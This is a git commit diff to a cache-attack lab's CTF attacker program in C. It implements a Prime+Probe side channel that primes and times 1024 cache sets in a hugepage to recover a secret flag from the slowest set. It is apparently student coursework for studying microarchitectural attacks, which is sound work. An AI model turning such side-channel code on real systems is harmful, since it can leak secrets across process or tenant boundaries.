c6c4bdb56046c3c38e45a449061b43f0a489e148
duykhuongnguyen <duykhuongnguyen277@gmail.com>
2025-04-12 19:12:57 -0400

    sf

--- lab-cacheattacks/Part3-CTF/attacker.c
+++ lab-cacheattacks/Part3-CTF/attacker.c
@@ -3,57 +3,58 @@
 #include <sys/mman.h>
 
 #define BUFF_SIZE (1<<21) // 2MB
+#define NUM_SETS 1024     // 2MB hugepage = 1024 cache sets
+#define STRIDE (1<<12)    // 4KB stride (different page offset)
+#define ADDRS_PER_SET 8   // Number of addresses per set
 
 int main(int argc, char const *argv[]) {
     int flag = -1;
 
-    // === Allocate large buffer using huge page ===
+    // Allocate hugepage memory
     uint8_t *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB,
                         -1, 0);
     if (buf == MAP_FAILED) {
-        perror("mmap() error\n");
+        perror("mmap() failed");
         exit(1);
     }
 
-    // === Prime and Probe ===
-
-    int slowest_set = -1;
-    uint64_t slowest_time = 0;
-
-    // Assume L2 cache has 1024 sets (adjust if different)
-    int NUM_SETS = 1024;
+    uint64_t best_time = 0;
+    int best_set = -1;
 
     for (int set_index = 0; set_index < NUM_SETS; set_index++) {
-        // Access a few addresses that map to this set
-        volatile uint8_t *addr = buf + (set_index * 64); // 64B cache line size
-
         uint64_t total_time = 0;
 
-        // Repeat multiple times to get stable measurements
-        for (int sample = 0; sample < 1000; sample++) {
-            *addr; // Prime the cache
+        // Collect multiple addresses mapping to this set
+        for (int a = 0; a < ADDRS_PER_SET; a++) {
+            volatile uint8_t *addr = buf + (set_index * 64) + (a * STRIDE);
+
+            // Prime - access all addresses
+            *addr;
         }
 
-        // Small busy-wait
-        for (volatile int j = 0; j < 10000; j++);
+        // Wait a little
+        for (volatile int i = 0; i < 10000; i++);
 
-        // Now measure the probe time
-        for (int sample = 0; sample < 10; sample++) {
-            total_time += measure_one_block_access_time((uint64_t)addr);
+        // Measure access times
+        for (int a = 0; a < ADDRS_PER_SET; a++) {
+            volatile uint8_t *addr = buf + (set_index * 64) + (a * STRIDE);
+
+            for (int repeat = 0; repeat < 5; repeat++) {
+                total_time += measure_one_block_access_time((uint64_t)addr);
+            }
         }
 
-        uint64_t average_time = total_time / 10;
-
-        if (average_time > slowest_time) {
-            slowest_time = average_time;
-            slowest_set = set_index;
+        // Compare total access time
+        if (total_time > best_time) {
+            best_time = total_time;
+            best_set = set_index;
         }
     }
 
-    // The slowest set corresponds to the secret flag
-    flag = slowest_set;
+    flag = best_set;
 
     printf("Flag: %d\n", flag);
+
     return 0;
 }
